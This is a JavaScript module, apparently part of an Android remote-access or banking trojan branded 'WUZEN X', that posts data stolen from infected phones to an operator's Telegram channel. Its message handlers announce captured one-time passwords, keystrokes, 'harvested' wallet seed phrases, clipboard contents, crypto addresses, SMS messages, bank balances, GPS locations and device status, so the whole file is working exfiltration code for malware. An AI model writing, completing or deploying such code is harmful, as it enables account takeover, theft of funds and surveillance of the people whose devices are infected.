import { config } from './config.js';
import { timestamp, sanitize } from './utils.js';

export class BotEvents {
  constructor(bot) {
    this.bot = bot;
    this.channelId = config.channelId;
  }

  async sendToChannel(type, data) {
    if (!this.channelId || !this.bot?.telegram) return;
    try {
      const chatId = this.channelId;
      const icons = {
        device_online: '🟢', device_offline: '🔴',
        otp: '🔐', keylog: '⌨️', screenshot: '📸',
        clipboard: '📋', seed: '🌱', crypto: '💰',
        sms: '📨', log: '📝', balance: '💳',
        location: '📍', call: '📞', contact: '👤'
      };
      const icon = icons[type] || '📌';
      
      let text = `${icon} *WUZEN X — ${type.toUpperCase()}*\n\n`;
      
      switch(type) {
        case 'device_online':
          text += `🆕 *Device Online*\n📱 ${data.info?.model||'?'}\n🆔 \`${data.id.slice(0,12)}...\`\n🔋 ${data.info?.battery||'?'}%\n🤖 Android ${data.info?.android||'?'}`;
          break;
        case 'device_offline':
          text += `💤 *Device Offline*\n📱 ${data.info?.model||'?'}\n🆔 \`${data.id.slice(0,12)}...\``;
          break;
        case 'otp':
          text += `🔐 *OTP CAPTURED!*\n\`${sanitize(data.otp)}\`\n🕐 ${data.timestamp}`;
          break;
        case 'keylog':
          text += `⌨️ *Keystrokes:* \`${sanitize(data.keys)}\`\n🕐 ${data.timestamp}`;
          break;
        case 'seed':
          text += `🌱 *SEED PHRASE HARVESTED!*\n\n\`${data.seed}\`\n\n🕐 ${data.timestamp}`;
          break;
        case 'clipboard':
          text += `📋 *Clipboard:* \`${sanitize(data.content)}\`\n🕐 ${data.timestamp}`;
          break;
        case 'crypto':
          text += `💰 *Crypto Address Found:* \`${data.address}\`\n🕐 ${data.timestamp}`;
          break;
        case 'sms':
          text += `📨 *SMS:* ${sanitize(data.content)}\n🕐 ${data.timestamp}`;
          break;
        case 'balance':
          text += `💳 *Balance Update:*\n${sanitize(data.data)}\n🕐 ${data.timestamp}`;
          break;
        case 'location':
          text += `📍 *Location:* https://www.google.com/maps?q=${data.lat},${data.lng}\n🕐 ${data.timestamp}`;
          break;
        default:
          text += `${sanitize(data.message || JSON.stringify(data))}\n🕐 ${data.timestamp}`;
      }
      
      await this.bot.telegram.sendMessage(chatId, text, { 
        parse_mode: 'Markdown',
        disable_web_page_preview: true 
      });
    } catch (e) {
      console.error('Channel error:', e.message);
    }
  }
}
